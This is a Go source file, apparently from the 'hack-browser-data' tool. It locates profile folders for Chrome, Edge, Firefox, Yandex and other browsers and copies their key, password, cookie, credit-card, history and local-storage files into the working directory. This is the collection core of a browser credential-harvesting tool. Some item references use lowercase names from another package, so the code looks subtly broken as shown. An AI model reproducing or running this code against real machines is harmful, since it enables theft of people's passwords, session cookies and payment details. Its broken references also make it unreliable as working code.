package browser

import (
	"fmt"
	"io/fs"
	"io/ioutil"
	"os"
	"path"
	"path/filepath"
	"strings"

	"hack-browser-data/internal/browser/data"
	"hack-browser-data/internal/browser/item"
)

type Browser interface {
	GetName() string

	GetMasterKey() ([]byte, error)

	GetBrowsingData() []data.BrowsingData

	CopyItemFileToLocal() error
}

var (
	// home dir path not for android and ios
	homeDir, _ = os.UserHomeDir()
)

func PickBrowser(name string) []Browser {
	var browsers []Browser
	clist := pickChromium(name)
	for _, b := range clist {
		if b != nil {
			browsers = append(browsers, b)
		}
	}
	flist := pickFirefox(name)
	for _, b := range flist {
		if b != nil {
			browsers = append(browsers, b)
		}
	}
	return browsers
}

func pickChromium(name string) []Browser {
	var browsers []Browser
	name = strings.ToLower(name)
	if name == "all" {
		for _, choice := range chromiumList {
			if b, err := newChromium(choice.browserInfo, choice.items); err == nil {
				browsers = append(browsers, b)
			} else {
				if strings.Contains(err.Error(), "profile path is not exist") {
					continue
				}
				panic(err)
			}
		}
		return browsers
	}
	if choice, ok := chromiumList[name]; ok {
		b, err := newChromium(choice.browserInfo, choice.items)
		if err != nil {
			panic(err)
		}
		browsers = append(browsers, b)
		return browsers
	}
	return nil
}

func pickFirefox(name string) []Browser {
	var browsers []Browser
	name = strings.ToLower(name)
	if name == "all" || name == "firefox" {
		for _, f := range firefoxList {
			multiFirefox, err := newMultiFirefox(f.browserInfo, f.items)
			if err != nil {
				panic(err)
			}
			for _, browser := range multiFirefox {
				browsers = append(browsers, browser)
			}
		}
		return browsers
	}
	return nil
}

type chromium struct {
	browserInfo *browserInfo
	items       []item.Item
	itemPaths   map[item.Item]string
}

// newChromium 根据浏览器信息生成 Browser Interface
func newChromium(info *browserInfo, items []item.Item) (*chromium, error) {
	c := &chromium{
		browserInfo: info,
		items:       items,
	}
	absProfilePath := path.Join(homeDir, filepath.Clean(c.browserInfo.profilePath))
	// TODO: Handle file path is not exist
	if !isFileExist(absProfilePath) {
		return nil, fmt.Errorf("%s profile path is not exist", absProfilePath)
	}
	itemsPaths, err := getChromiumItemPath(absProfilePath, c.items)
	if err != nil {
		return nil, err
	}
	c.itemPaths = itemsPaths
	return c, err
}

func (c *chromium) GetName() string {
	return c.browserInfo.name
}

func (c *chromium) GetBrowsingData() []data.BrowsingData {
	var browsingData []data.BrowsingData
	for item := range c.itemPaths {
		d := item.NewBrowsingData()
		if d != nil {
			browsingData = append(browsingData, d)
		}
	}
	return browsingData
}

func (c *chromium) CopyItemFileToLocal() error {
	for item, sourcePath := range c.itemPaths {
		var dstFilename = item.FileName()
		locals, _ := filepath.Glob("*")
		for _, v := range locals {
			if v == dstFilename {
				err := os.Remove(dstFilename)
				// TODO: Should Continue all iteration error
				if err != nil {
					return err
				}
			}
		}

		// TODO: Handle read file error
		sourceFile, err := ioutil.ReadFile(sourcePath)
		if err != nil {
			fmt.Println(err.Error())
		}
		err = ioutil.WriteFile(dstFilename, sourceFile, 0777)
		if err != nil {
			return err
		}
	}
	return nil
}

type firefox struct {
	browserInfo    *browserInfo
	items          []item.Item
	itemPaths      map[item.Item]string
	multiItemPaths map[string]map[item.Item]string
}

// newFirefox
func newMultiFirefox(info *browserInfo, items []item.Item) ([]*firefox, error) {
	f := &firefox{
		browserInfo: info,
		items:       items,
	}
	multiItemPaths, err := getFirefoxItemAbsPath(f.browserInfo.profilePath, f.items)
	if err != nil {
		if strings.Contains(err.Error(), "profile path is not exist") {
			fmt.Println(err)
			return nil, nil
		}
		panic(err)
	}
	var firefoxList []*firefox
	for name, value := range multiItemPaths {
		firefoxList = append(firefoxList, &firefox{
			browserInfo: &browserInfo{
				name:      name,
				masterKey: nil,
			},
			items:     items,
			itemPaths: value,
		})
	}
	return firefoxList, nil
}

func getFirefoxItemAbsPath(profilePath string, items []item.Item) (map[string]map[item.Item]string, error) {
	var multiItemPaths = make(map[string]map[item.Item]string)
	absProfilePath := path.Join(homeDir, filepath.Clean(profilePath))
	// TODO: Handle read file error
	if !isFileExist(absProfilePath) {
		return nil, fmt.Errorf("%s profile path is not exist", absProfilePath)
	}
	err := filepath.Walk(absProfilePath, firefoxWalkFunc(items, multiItemPaths))
	return multiItemPaths, err
}

func (f *firefox) CopyItemFileToLocal() error {
	for item, sourcePath := range f.itemPaths {
		var dstFilename = item.FileName()
		locals, _ := filepath.Glob("*")
		for _, v := range locals {
			if v == dstFilename {
				err := os.Remove(dstFilename)
				// TODO: Should Continue all iteration error
				if err != nil {
					return err
				}
			}
		}

		// TODO: Handle read file name error
		sourceFile, err := ioutil.ReadFile(sourcePath)
		if err != nil {
			fmt.Println(err.Error())
		}
		err = ioutil.WriteFile(dstFilename, sourceFile, 0777)
		if err != nil {
			return err
		}
	}
	return nil
}

func firefoxWalkFunc(items []item.Item, multiItemPaths map[string]map[item.Item]string) filepath.WalkFunc {
	return func(path string, info fs.FileInfo, err error) error {
		for _, v := range items {
			if info.Name() == v.DefaultName() {
				parentDir := getParentDir(path)
				if _, exist := multiItemPaths[parentDir]; exist {
					multiItemPaths[parentDir][v] = path
				} else {
					multiItemPaths[parentDir] = map[item.Item]string{v: path}
				}
			}
		}
		return err
	}
}

func getParentDir(absPath string) string {
	return filepath.Base(filepath.Dir(absPath))
}

func (f *firefox) GetMasterKey() ([]byte, error) {
	return f.browserInfo.masterKey, nil
}

func (f *firefox) GetName() string {
	return f.browserInfo.name
}

func (f *firefox) GetBrowsingData() []data.BrowsingData {
	var browsingData []data.BrowsingData
	for item := range f.itemPaths {
		d := item.NewBrowsingData()
		if d != nil {
			browsingData = append(browsingData, d)
		}
	}
	return browsingData
}

func ListBrowser() []string {
	var l []string
	for c := range chromiumList {
		l = append(l, c)
	}
	for f := range firefoxList {
		l = append(l, f)
	}
	return l
}

func isFileExist(path string) bool {
	if _, err := os.Stat(path); os.IsNotExist(err) {
		return false
	}
	return true
}

type browserInfo struct {
	name        string
	storage     string
	profilePath string
	masterKey   []byte
}

const (
	chromeName         = "Chrome"
	chromeBetaName     = "Chrome Beta"
	chromiumName       = "Chromium"
	edgeName           = "Microsoft Edge"
	firefoxName        = "Firefox"
	firefoxBetaName    = "Firefox Beta"
	firefoxDevName     = "Firefox Dev"
	firefoxNightlyName = "Firefox Nightly"
	firefoxESRName     = "Firefox ESR"
	speed360Name       = "360speed"
	qqBrowserName      = "QQ"
	braveName          = "Brave"
	operaName          = "Opera"
	operaGXName        = "OperaGX"
	vivaldiName        = "Vivaldi"
	coccocName         = "CocCoc"
	yandexName         = "Yandex"
)

var defaultFirefoxItems = []item.Item{
	item.firefoxKey4,
	item.firefoxPassword,
	item.firefoxCookie,
	item.firefoxBookmark,
	item.firefoxHistory,
	item.firefoxDownload,
	item.firefoxCreditCard,
	item.firefoxLocalStorage,
	item.firefoxExtension,
}

var defaultYandexItems = []item.Item{
	item.chromiumKey,
	item.yandexPassword,
	item.chromiumCookie,
	item.chromiumBookmark,
	item.chromiumHistory,
	item.chromiumDownload,
	item.yandexCreditCard,
	item.chromiumLocalStorage,
	item.chromiumExtension,
}

var defaultChromiumItems = []item.Item{
	item.chromiumKey,
	item.chromiumPassword,
	item.chromiumCookie,
	item.chromiumBookmark,
	item.chromiumHistory,
	item.chromiumDownload,
	item.chromiumCreditCard,
	item.chromiumLocalStorage,
	item.chromiumExtension,
}
